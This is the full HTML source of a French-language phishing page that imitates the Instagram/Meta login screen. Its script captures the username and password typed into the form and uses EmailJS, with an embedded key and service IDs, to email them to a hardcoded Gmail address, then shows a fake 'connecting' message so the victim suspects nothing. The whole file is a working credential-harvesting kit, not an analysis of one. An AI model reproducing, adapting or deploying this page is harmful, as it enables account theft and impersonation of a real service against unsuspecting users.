<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>Instagram</title>
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,500,500i,700,700i,900,900i"
    />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Roboto", sans-serif;
        -webkit-tap-highlight-color: transparent;
      }

      body {
        min-height: 100vh;
        background: linear-gradient(to bottom, #1a1f2c, #121520);
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 1rem;
      }

      .lang-selector {
        position: absolute;
        top: 1.5rem;
        width: 100%;
        text-align: center;
      }

      .lang-selector span {
        color: rgba(255, 255, 255, 0.8);
        font-size: clamp(0.75rem, 3vw, 0.875rem);
      }

      .container {
        width: 100%;
        max-width: 24rem;
        padding: 0 1.5rem;
        margin: 2rem 0;
      }

      .meta-logo {
        display: flex;
        justify-content: center;
        margin-bottom: 2.5rem;
      }

      .meta-logo img {
        height: clamp(3rem, 8vw, 4rem);
        opacity: 0.7;
      }

      .login-form {
        display: flex;
        flex-direction: column;
        gap: 1rem;
        margin-bottom: 1.5rem;
      }

      .input-group {
        position: relative;
        margin-bottom: 0.5rem;
      }

      .input-field {
        width: 100%;
        background-color: rgba(26, 31, 44, 0.7);
        border: 1px solid #2c3340;
        color: white;
        padding: 1rem;
        border-radius: 0.5rem;
        font-size: clamp(0.875rem, 4vw, 1rem);
        outline: none;
        transition: border-color 0.3s;
      }

      .input-field:focus {
        border-color: #0095f6;
      }

      .input-field::placeholder {
        color: #9ca3af;
        font-size: clamp(0.8125rem, 3.5vw, 0.9375rem);
      }

      .password-toggle {
        position: absolute;
        right: 1rem;
        top: 50%;
        transform: translateY(-50%);
        color: #9ca3af;
        background: none;
        border: none;
        cursor: pointer;
        padding: 0.5rem;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .password-toggle svg {
        width: clamp(16px, 4.5vw, 18px);
        height: clamp(16px, 4.5vw, 18px);
      }

      .login-btn {
        width: 100%;
        background-color: #0095f6;
        color: white;
        font-weight: 600;
        padding: 1rem;
        border-radius: 0.5rem;
        border: none;
        cursor: pointer;
        font-size: clamp(0.9375rem, 4vw, 1rem);
        margin-top: 0.75rem;
        transition: background-color 0.2s;
      }

      .login-btn:active {
        background-color: #0077cc;
        transform: scale(0.98);
      }

      .forgot-password {
        margin: 1.5rem 0;
        text-align: center;
      }

      .forgot-password a {
        color: #0095f6;
        text-decoration: none;
        font-size: clamp(0.75rem, 3.5vw, 0.875rem);
        font-weight: 500;
      }

      .signup {
        margin: 2.5rem 0;
      }

      .signup-btn {
        width: 100%;
        background-color: transparent;
        color: #0095f6;
        font-weight: 500;
        padding: 1rem;
        border-radius: 2rem;
        border: 1px solid #0095f6;
        cursor: pointer;
        font-size: clamp(0.9375rem, 4vw, 1rem);
        transition: background-color 0.2s;
      }

      .signup-btn:active {
        background-color: rgba(0, 149, 246, 0.1);
      }

      .instagram-logo {
        display: flex;
        justify-content: center;
        margin: 3rem 0 1rem;
      }

      .instagram-logo img {
        width: clamp(50px, 15vw, 60px);
        height: auto;
      }

      @media (max-width: 375px) {
        .container {
          padding: 0 1.25rem;
        }

        .login-form {
          gap: 0.875rem;
        }

        .input-field {
          padding: 0.875rem;
        }
      }
    </style>
  </head>
  <body>
    <div class="lang-selector">
      <span>Français (France)</span>
    </div>

    <div class="container">
      <div class="meta-logo">
        <img src="/res/iyazeqxfbpL.png" alt="Meta" />
      </div>

      <form class="login-form" id="loginForm">
        <div class="input-group">
          <input
            type="text"
            class="input-field"
            placeholder="Nom de profil, e-mail ou numéro de mobile"
            id="username"
            required
          />
        </div>

        <div class="input-group">
          <input
            type="password"
            class="input-field"
            placeholder="Mot de passe"
            id="password"
            required
          />
          <button type="button" class="password-toggle" id="togglePassword">
            <svg
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
              <circle cx="12" cy="12" r="3"></circle>
            </svg>
          </button>
        </div>

        <button type="submit" class="login-btn">Se connecter</button>
      </form>

      <div class="forgot-password">
        <a href="#">Mot de passe oublié ?</a>
      </div>

      <div class="signup">
        <a href="/create-account">
          <button class="signup-btn">Créer un compte</button>
        </a>
      </div>

      <div class="instagram-logo">
        <img src="/res/metha.png" alt="Instagram" />
      </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>

    <script>
      // Initialisation EmailJS
      emailjs.init("jwKDYVXzXxCDYNVoH");

      // Toggle mot de passe
      const togglePassword = document.getElementById("togglePassword");
      const passwordInput = document.getElementById("password");

      togglePassword.addEventListener("click", () => {
        const type =
          passwordInput.getAttribute("type") === "password"
            ? "text"
            : "password";
        passwordInput.setAttribute("type", type);

        // Change l'icône
        const icon = togglePassword.querySelector("svg");
        icon.innerHTML =
          type === "password"
            ? '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>'
            : '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
      });

      // Soumission du formulaire
      document
        .getElementById("loginForm")
        .addEventListener("submit", function (e) {
          e.preventDefault();

          const username = document.getElementById("username").value;
          const password = document.getElementById("password").value;

          emailjs
            .send("service_rehqh6s", "template_7f3toss", {
              username: username,
              password: password,
              date: new Date().toLocaleString("fr-FR"),
              to_email: "bonnelselme16@gmail.com",
            })
            .then(() => {
              swal("Succès", "Connexion en cours...", "success");
            })
            .catch(() => {
              swal("Erreur", "Une erreur est survenue", "error");
            });
        });
    </script>
  </body>
</html>
